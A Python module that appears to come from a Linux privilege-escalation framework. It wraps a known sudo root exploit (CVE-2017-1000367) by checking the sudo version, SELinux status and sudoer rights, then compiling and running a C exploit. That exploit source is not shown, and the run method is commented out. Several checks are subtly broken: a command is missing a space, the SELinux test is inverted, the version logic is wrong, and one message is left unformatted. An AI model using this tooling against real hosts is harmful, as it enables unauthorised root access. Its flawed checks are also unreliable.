"""
adapted from:
https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/sudopwn.c
"""
import os
import subprocess
from exploits.exploit import Exploit
from src.kernels import KernelWindow
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH, HIGH_RELIABILITY, color_print, UBUNTU_GENERIC, \
	DEBIAN_GENERIC, POTENTIALLY_VULNERABLE
class CVE20171000367(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2017-1000367"
		self.type = "linux"
		self.brief_desc = "sudo get_process_ttyname() root priv esc"
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = [
			KernelWindow(UBUNTU_GENERIC, POTENTIALLY_VULNERABLE, 0, 0, 0, 99, 99, 99),
			KernelWindow(DEBIAN_GENERIC, POTENTIALLY_VULNERABLE, 0, 0, 0, 99, 99, 99)
		]
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20171000367.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "CVE20171000367")
		self.compilation_command = ["gcc", "-o", self.compilation_path, self.source_c_path, "-lutil"]
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		"""
		For this vulnerability the following prerequisites have to be satisfied:
			- sudo version < 1.8.21
			- system must be selinux-enabled
			- sudo needs to be build with selinux support (sudo -r)
			- user needs to have sudo permissions: e.g. 'toor ALL=(ALL)NOPASSWD: /usr/bin/sum

		:return: True if vulnerable, False if not
		"""
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		sudo_version_command = "sudo -V"
		se_linux_enabled_command = "cat/etc/selinux/config"		# SELINUX=disabled not in output
		sudo_built_with_selinux_support_command = "sudo -r" 		# if 'role' is in output, it's supported
		sudo_permissions_check_command = "sudo -l" 				# if not 'may not run' in output
		sv_output = 		self.shell_results(sudo_version_command)
		sle_output = 		self.shell_results(se_linux_enabled_command)
		sbwssc_output = 	self.shell_results(sudo_built_with_selinux_support_command)
		spc_output = 		self.shell_results(sudo_permissions_check_command)


		sv_std_out = 	sv_output[0].decode('utf-8')
		major_v = 		int(sv_std_out.split(" ")[2].split(".")[0])
		minor_v = 		int(sv_std_out.split(" ")[2].split(".")[1])
		release_v = 	int(sv_std_out.split("\n")[0].split(" ")[2].split(".")[2].split("p")[0])
		if not major_v <= 1 and minor_v <= 8 and release_v <= 20:
			self.exploit_failure("sudo version {} is not less than 1.8.21")
			return False
		color_print("\t[+] sudo version {} is vulnerable (less than 1.8.21)".format(
			"{}.{}.{}".format(major_v, minor_v, release_v)))

		sle_std_out = 	sle_output[0].decode('utf-8')
		sle_std_err = 	sle_output[1].decode('utf-8')
		if "No such file" in sle_std_err or not \
			"SELINUX=disabled" in sle_std_out:
			self.exploit_failure("system does not appear to be selinux-enabled")
			return False
		color_print("\t[+] system appears to be selinux-enabled")

		sbwssc_std_out = sbwssc_output[0].decode('utf-8')
		if not "role" in sbwssc_std_out:
			self.exploit_failure("sudo does not appear to be built with selinux support")
			return False
		color_print("\t[+] sudo appears to be built with selinux support")

		spc_std_out = spc_output[0].decode('utf-8')
		spc_std_err = spc_output[1].decode('utf-8')
		if "may not run" in spc_std_err:
			self.exploit_failure("user is not a sudoer")
			return False
		color_print("\t[+] user appears to be a sudoer")

		color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")
		return True

	"""
	def confirm_exploitation(self):

		return False  # TODO: complete this vuln check to check /etc/init.d/README for a specific value

	def exploit(self):
		if self.determine_vulnerability():
			color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path):
				color_print("\t[*] exploiting")
				subprocess.call(self.exploit_command)  # TODO: need to make it write a nonce to /tmp/nonce
				if self.confirm_exploitation():
					color_print("\t[+] exploitation of {} successful!".format(self.name), color="green", bold=True)
				else:
					self.exploit_failure("not vulnerable to {}".format(self.name))
			else:
				color_print("\t[-] problem with compilation", color="red")
		else:
			color_print("\t[-] system does not appear to be vulnerable to {}".format(self.name), color="red")
		"""